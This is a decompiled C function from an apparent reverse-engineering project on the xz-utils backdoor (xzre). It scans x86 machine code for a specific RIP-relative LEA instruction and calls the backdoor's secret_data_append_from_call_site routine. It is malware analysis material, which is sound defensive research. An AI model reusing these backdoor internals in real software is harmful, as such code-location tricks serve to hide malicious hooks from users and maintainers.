// /home/kali/xzre-ghidra/xzregh/100F60_find_lea_instruction_with_mem_operand.c
// Function: find_lea_instruction_with_mem_operand @ 0x100F60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction_with_mem_operand(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, void * mem_address)


BOOL find_lea_instruction_with_mem_operand
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,void *mem_address)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  byte bVar5;
  dasm_ctx_t local_80;
  
  bVar5 = 0;
  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x1c8,0,0x1e,0);
  if (BVar2 != 0) {
    pdVar4 = &local_80;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)&pdVar4->instruction = 0;
      pdVar4 = (dasm_ctx_t *)((long)pdVar4 + ((ulong)bVar5 * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &local_80;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if ((((BVar2 != 0) &&
           (iVar1._0_1_ = dctx->_unknown810[0], iVar1._1_1_ = dctx->_unknown810[1],
           iVar1._2_1_ = dctx->_unknown810[2], iVar1._3_1_ = dctx->field_0x2b, iVar1 == 0x10d)) &&
          (((dctx->field2_0x10).field0.field10_0xb.rex_byte & 0x48) == 0x48)) &&
         ((((dctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000 &&
          ((mem_address == (void *)0x0 ||
           (dctx->instruction + *(long *)dctx->_unknown812 + dctx->instruction_size ==
            (u8 *)mem_address)))))) {
        return 1;
      }
    }
  }
  return 0;
}

